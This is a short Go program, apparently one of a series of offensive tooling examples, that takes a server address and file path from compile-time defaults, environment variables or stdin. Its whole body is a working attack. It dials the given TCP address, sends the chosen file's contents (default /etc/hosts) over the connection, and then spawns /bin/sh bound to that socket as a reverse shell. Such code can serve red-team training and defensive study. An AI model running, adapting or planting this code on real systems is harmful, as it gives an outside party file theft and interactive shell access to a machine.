// Program argv_from_stdin - argv_from_environment which also tries to read
// config from stdin.
package main

/*
 * argv_from_stdin.go
 * argv_from_environment, but also tries to read config from stdin
 * By J. Stuart McMurray
 * Created 20240901
 * Last Modified 20240906
 */

import (
	"cmp"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
)

// Compile-time configurables
var (
	Address       = "localhost:4444"
	AddressEnvVar = "ALPT4ATS_ADDRESS"
	File          = "/etc/hosts"
	FileEnvVar    = "ALPT4ATS_FILE"
)

func main() {
	/* Config from environment overrides compile-time config. */
	Address = cmp.Or(os.Getenv(AddressEnvVar), Address)
	File = cmp.Or(os.Getenv(FileEnvVar), File)

	/* Config from stdin overrides config from environment. */
	if _, err := fmt.Fscan(
		os.Stdin,
		&Address,
		&File,
	); nil != err && !errors.Is(err, io.EOF) {
		log.Fatalf("Error reading config from stdin: %s", err)
	}

	/* Connect to the server. */
	c, err := net.Dial("tcp", Address)
	if nil != err {
		log.Fatalf("Error connecting to server: %s", err)
	}

	/* Send back the file. */
	b, err := os.ReadFile(File)
	if nil != err {
		log.Fatalf("Error reading file: %s", err)
	}
	if _, err := c.Write(b); nil != err {
		log.Printf("Error sending file: %s", err)
	}

	/* Spawn a shell. */
	sh := exec.Command("/bin/sh")
	sh.Stdin = c
	sh.Stdout = c
	sh.Stderr = c
	if err := sh.Run(); nil != err {
		log.Fatalf("Shell died: %s", err)
	}
}
